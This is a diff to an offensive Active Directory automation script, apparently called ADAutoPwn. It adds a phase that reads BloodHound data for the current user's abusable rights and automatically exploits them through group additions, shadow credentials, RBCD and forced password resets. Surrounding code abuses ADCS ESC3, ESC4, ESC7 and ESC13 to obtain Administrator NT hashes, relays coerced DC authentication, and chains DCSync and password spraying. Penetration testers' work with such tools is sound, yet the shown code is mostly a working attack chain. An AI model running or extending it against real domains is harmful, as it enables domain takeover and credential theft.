@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.12.0"
+readonly VERSION="1.13.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -147,9 +147,11 @@ GRAPH_ZIP=""        # --graph: render a BloodHound zip to graph.html and exit
 OWNED_FILE=""       # --owned: file of compromised principals to flag in the graph
 NO_OPEN=0           # 1 = never auto-open the graph in a browser
 PIVOT_PW='ADAutoPwn!2024#Reset'   # password set when abusing ForceChangePassword
-CERTIPY_TO=180      # hard timeout (s) on every certipy call — it loves to hang on
+CERTIPY_TO=120      # hard timeout (s) on every certipy call — it loves to hang on
                     # an unreachable CA / bad DNS / Kerberos bind, and a hung scan
-                    # is worse than a missed ESC. The relay attempt has its own cap.
+                    # is worse than a missed ESC. Wrapped as `timeout -k 15` so a
+                    # certipy that ignores SIGTERM still gets SIGKILL'd 15s later
+                    # (a plain timeout left it hanging, un-cancellable).
 
 declare -a FOUND_USERS=()
 declare -a CRED_QUEUE=()          # pending creds to assess: "user|pass|hash"
@@ -166,6 +168,7 @@ declare -A OWNED_ADMIN=()         # compromised user (lowercased) → 1 if privi
 declare -A REQUEUED_SELF=()       # user (lc) re-assessed once after a self-group-add (no loops)
 declare -A CHAIN_FROM=()          # identity (lc) → the identity we pivoted FROM to reach it
 declare -A CHAIN_VIA=()           # identity (lc) → the technique that yielded it
+declare -A ABUSED_GLOBAL=()       # "target:right" already abused (across phases), fire once
 KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
 # Groups that mean "this account is effectively privileged" → crown it in the summary
 ADMIN_GROUP_RE='Domain Admins|Enterprise Admins|Schema Admins|Administrators|Account Operators|Backup Operators|Server Operators|Print Operators|DnsAdmins|Group Policy Creator Owners|Enterprise Key Admins|Key Admins|Domain Controllers'
@@ -849,18 +852,18 @@ phase_adcs() {
     elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
     elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
     run "certipy find ${cbase[*]} ${cauth[*]} -stdout -vulnerable"
-    local cout; cout=$("${cenv[@]}" timeout "${CERTIPY_TO:-180}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
+    local cout; cout=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
     # Password/NTLM bind refused but we have a ticket → retry over Kerberos.
     if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|STATUS_' <<<"$cout" \
        && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
         warn "certipy password/NTLM bind failed → retrying over Kerberos"
         cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
-        cout=$("${cenv[@]}" timeout "${CERTIPY_TO:-180}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
+        cout=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
     fi
     echo "$cout" | tee -a "$LOGFILE"; echo "$cout" >"$OUTDIR/certipy_find.txt"
 
     # full structured output (BloodHound + JSON) for later analysis
-    "${cenv[@]}" timeout "${CERTIPY_TO:-180}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy" >/dev/null 2>&1
+    "${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy" >/dev/null 2>&1
 
     if echo "$cout" | grep -qiE 'ESC[0-9]+'; then
         local escs; escs=$(echo "$cout" | grep -oiE 'ESC[0-9]+' | sort -u | tr '\n' ' ')
@@ -877,6 +880,89 @@ phase_adcs() {
 # ===========================================================================
 #  PHASE 8 — BLOODHOUND COLLECTION
 # ===========================================================================
+# ===========================================================================
+#  BLOODHOUND-DRIVEN ABUSE  —  mine the collected BH data for the current user's
+#  outbound abusable edges and feed them to the same abuse engine. This COMPLEMENTS
+#  `bloodyAD get writable`: the two disagree often — bloodyAD misses constrained
+#  rights like AddSelf/AddMember over groups (Self-Membership), while BH may miss
+#  things bloodyAD sees — so we run BOTH and dedup, for graph-parity coverage.
+# ===========================================================================
+_bh_latest_zip() { ls -t "$OUTDIR"/bloodhound/*_bloodhound.zip "$OUTDIR"/bloodhound/*.zip 2>/dev/null | head -1; }
+
+# env: BHZIP=<zip> OWNER=<sAMAccountName> → prints "RightName<TAB>targetSAM<TAB>targetType"
+_bh_outbound_edges_py() {
+python3 - <<'PYEOF'
+import os, sys, json, zipfile
+zf=os.environ.get("BHZIP",""); owner=os.environ.get("OWNER","").lower()
+if not zf or not os.path.exists(zf) or not owner: sys.exit(0)
+data={}
+try:
+    with zipfile.ZipFile(zf) as z:
+        for n in z.namelist():
+            if n.lower().endswith(".json"):
+                try: data[n]=json.load(z.open(n))
+                except Exception: pass
+except Exception: sys.exit(0)
+def short(s): return str(s or "").split("@")[0]
+objs=[]; owner_sid=None
+for fn,doc in data.items():
+    low=fn.lower()
+    typ=("User" if "users" in low else "Group" if "groups" in low else
+         "Computer" if "computers" in low else "OU" if "ous" in low else "Base")
+    for o in (doc.get("data") or []):
+        oid=o.get("ObjectIdentifier") or ""
+        props=o.get("Properties") or {}
+        sam=short(props.get("samaccountname") or props.get("name") or oid)
+        objs.append((sam,typ,o.get("Aces") or []))
+        if owner in (sam.lower(), short(props.get("name","")).lower()): owner_sid=oid
+if not owner_sid: sys.exit(0)
+ABUSABLE={"GenericAll","GenericWrite","WriteDacl","WriteOwner","Owns","AddMember","AddSelf",
+          "ForceChangePassword","AllExtendedRights","AddKeyCredentialLink","WriteSPN","AddAllowedToAct",
+          "ReadGMSAPassword","ReadLAPSPassword"}
+seen=set()
+for sam,typ,aces in objs:
+    for a in aces:
+        r=a.get("RightName")
+        if a.get("PrincipalSID","")==owner_sid and r in ABUSABLE:
+            k=(r,sam,typ)
+            if k in seen: continue
+            seen.add(k); print("%s\t%s\t%s"%(r,sam,typ))
+PYEOF
+}
+
+phase_bh_abuse() {
+    [[ "$HAVE_AUTH" != "1" ]] && return
+    local zip; zip=$(_bh_latest_zip); [[ -z "$zip" ]] && return
+    local edges; edges=$(BHZIP="$zip" OWNER="$USER" _bh_outbound_edges_py 2>/dev/null)
+    [[ -z "$edges" ]] && return
+    section "BLOODHOUND-DRIVEN ABUSE · ${USER}'s outbound rights (graph parity)"
+    [[ "$DO_ABUSE" != "1" ]] && info "  (report-only; --abuse to act on these BloodHound edges)"
+    local right tgt cls dk
+    while IFS=$'\t' read -r right tgt cls; do
+        [[ -z "$right" || -z "$tgt" ]] && continue
+        dk="${tgt,,}:${right,,}"
+        [[ -n "${ABUSED_GLOBAL[$dk]:-}" ]] && continue   # already handled (here or in the ACL phase)
+        ABUSED_GLOBAL["$dk"]=1
+        loot "BH edge: ${C_BOLD}${USER}${C_RESET} --${C_PURPLE}${right}${C_RESET}→ ${C_BOLD}${tgt}${C_RESET} (${cls})"
+        [[ "$DO_ABUSE" != "1" ]] && continue
+        case "$right" in
+            AddMember|AddSelf)     _abuse_group "$tgt" ;;
+            AddKeyCredentialLink)  _abuse_shadowcred "$tgt" ;;
+            WriteSPN)              _abuse_writespn "$tgt" ;;
+            AddAllowedToAct)       _abuse_rbcd "$tgt" ;;
+            ForceChangePassword)   _abuse_user "$tgt" ;;
+            ReadGMSAPassword|ReadLAPSPassword) info "  → secret read handled in the Secrets phase" ;;
+            GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AllExtendedRights)
+                case "$cls" in
+                    Group)    _abuse_group "$tgt" ;;
+                    Computer) _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" ;;
+                    OU)       loot "GenericAll over OU '$tgt' → restore handled in the lifecycle phase" ;;
+                    *)        _abuse_user_smart "$tgt" ;;
+                esac ;;
+        esac
+    done <<<"$edges"
+}
+
 phase_bloodhound() {
     [[ "$HAVE_AUTH" != "1" || "$DO_BLOODHOUND" != "1" ]] && return
     section "PHASE 8 · BLOODHOUND — ATTACK GRAPH COLLECTION"
@@ -1462,11 +1548,11 @@ _abuse_shadowcred() {
     elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
     elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
     run "certipy shadow auto ${cbase[*]} ${cauth[*]}"
-    local out; out=$("${cenv[@]}" timeout "${CERTIPY_TO:-180}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
+    local out; out=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
     if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|No credentials provided' <<<"$out" \
        && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
         cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
-        out=$("${cenv[@]}" timeout "${CERTIPY_TO:-180}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
+        out=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
     fi
     echo "$out" | tee -a "$LOGFILE"
     local nt; nt=$(echo "$out" | grep -oiP "Got hash for .*:\s*\K\S+" | awk -F: '{print $NF}' | head -1)
@@ -1597,7 +1683,7 @@ _adcs_pwn_pfx() {                       # _adcs_pwn_pfx <pfx-basename> <label> [
     [[ -z "$pfx" || ! -f "$OUTDIR/$pfx" ]] && { warn "  ${label}: no certificate produced"; return 1; }
     rb_record "${label}: issued/used a certificate for '${who}'" "echo 'Manual: revoke the issued certificate at the CA'"
     run "certipy auth -pfx $pfx -dc-ip $DC_IP"
-    local aout; aout=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy auth -pfx "$pfx" -dc-ip "$DC_IP" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
+    local aout; aout=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy auth -pfx "$pfx" -dc-ip "$DC_IP" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
     local nt; nt=$(grep -oiP 'Got hash for .*:\s*\K[a-f0-9]{32}:[a-f0-9]{32}' <<<"$aout" | awk -F: '{print $NF}' | head -1)
     if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
         loot "★★★ ${label} → ${who} NT hash: ${C_MAGENTA}$nt${C_RESET}"
@@ -1618,7 +1704,7 @@ _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <wi
     local rargs=(req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" -upn "administrator@${DOMAIN}" \
                  "${sidargs[@]}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" "$@")
     run "certipy ${rargs[*]}"
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy "${rargs[@]}" 2>&1 ) | tee -a "$LOGFILE"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy "${rargs[@]}" 2>&1 ) | tee -a "$LOGFILE"
     _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null | head -1 | xargs -r basename)" "$label"
 }
 
@@ -1626,11 +1712,11 @@ _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <wi
 _adcs_esc3() {
     local ca="$1" agenttpl="$2"; _adcs_setauth
     confirm "  ESC3: use Enrollment Agent template '$agenttpl' to enrol on behalf of Administrator?" || return 1
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
         -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     local agent; agent=$(ls -t "$OUTDIR"/*.pfx 2>/dev/null | grep -vi administrator | head -1)
     [[ -z "$agent" ]] && { warn "  ESC3: no enrollment-agent PFX produced"; return 1; }
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template User \
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template User \
         -on-behalf-of "${DOMAIN%%.*}\\administrator" -pfx "$(basename "$agent")" \
         -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null | head -1 | xargs -r basename)" "ESC3"
@@ -1639,13 +1725,13 @@ _adcs_esc3() {
 _adcs_esc4() {
     local ca="$1" tpl="$2"; _adcs_setauth
     confirm "  ESC4: reconfigure template '$tpl' to be vulnerable, exploit, then restore?" || return 1
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy template "${_ADCS_AUTH[@]}" -template "$tpl" \
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy template "${_ADCS_AUTH[@]}" -template "$tpl" \
         -write-default-configuration -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     rb_record "ESC4: overwrote template $tpl config" \
               "certipy template -template '$tpl' -configuration '$OUTDIR/${tpl}.json' -dc-ip '$DC_IP'  # restore saved config"
     _adcs_req_admin "$ca" "$tpl" "ESC4" 1; local rc=$?
     # restore the original template configuration (best-effort)
-    [[ -f "$OUTDIR/${tpl}.json" ]] && ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy template "${_ADCS_AUTH[@]}" \
+    [[ -f "$OUTDIR/${tpl}.json" ]] && ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy template "${_ADCS_AUTH[@]}" \
         -template "$tpl" -configuration "${tpl}.json" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
     return $rc
 }
@@ -1653,22 +1739,22 @@ _adcs_esc4() {
 _adcs_esc7() {
     local ca="$1"; _adcs_setauth
     confirm "  ESC7: add self as CA officer, enable SubCA, issue a request as Administrator?" || return 1
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -add-officer "$USER" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -add-officer "$USER" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
     rb_record "ESC7: added $USER as officer on CA $ca" "certipy ca -ca '$ca' -remove-officer '$USER' -dc-ip '$DC_IP'"
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -enable-template SubCA -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
-    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template SubCA \
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -enable-template SubCA -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template SubCA \
         -upn "administrator@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$out" | tee -a "$LOGFILE"
     local rid; rid=$(grep -oiP 'request ID is\s*\K[0-9]+' <<<"$out" | head -1)
     [[ -z "$rid" ]] && { _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null|head -1|xargs -r basename)" "ESC7"; return $?; }
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -issue-request "$rid" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -retrieve "$rid" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -issue-request "$rid" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -retrieve "$rid" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null|head -1|xargs -r basename)" "ESC7"
 }
 # ESC13 — issuance policy linked to a group: enrol, auth → TGT carries that group.
 _adcs_esc13() {
     local ca="$1" tpl="$2"; _adcs_setauth
     confirm "  ESC13: enrol template '$tpl' to inherit its linked (privileged) group?" || return 1
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
         -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     local pfx; pfx=$(ls -t "$OUTDIR"/*.pfx 2>/dev/null | head -1 | xargs -r basename)
     _adcs_pwn_pfx "$pfx" "ESC13" "$USER"   # self hash/TGT, now with the linked group in its PAC
@@ -1681,7 +1767,7 @@ _adcs_relay() {
     have certipy || return 1
     local tgt="http://${DC_FQDN:-$DCT}/certsrv/certfnsh.asp"
     run "certipy relay -target $tgt -template DomainController  (60s) + coerce DC→$lhost"
-    ( cd "$OUTDIR" && timeout 60 certipy relay -target "$tgt" -template DomainController 2>&1 | tee -a "$LOGFILE" ) &
+    ( cd "$OUTDIR" && timeout -k 10 60 certipy relay -target "$tgt" -template DomainController 2>&1 | tee -a "$LOGFILE" ) &
     local rpid=$!
     sleep 3
     $NXC smb "$DCT" $(nxc_cred_args | tr '\n' ' ') -M coerce_plus -o LISTENER="$lhost" 2>&1 | tail -5 | tee -a "$LOGFILE"
@@ -3551,6 +3637,7 @@ assess_current_credential() {
     phase_kerberoast;   jitter
     phase_adcs;         jitter
     if [[ "$BH_DONE" == "0" ]]; then phase_bloodhound; BH_DONE=1; jitter; fi
+    phase_bh_abuse;     jitter   # mine THIS identity's BloodHound edges (catches what get-writable misses, e.g. AddSelf)
     phase_dcsync;       jitter
     # Spray everything we recovered this round across all users → new pivots
     phase_password_spray
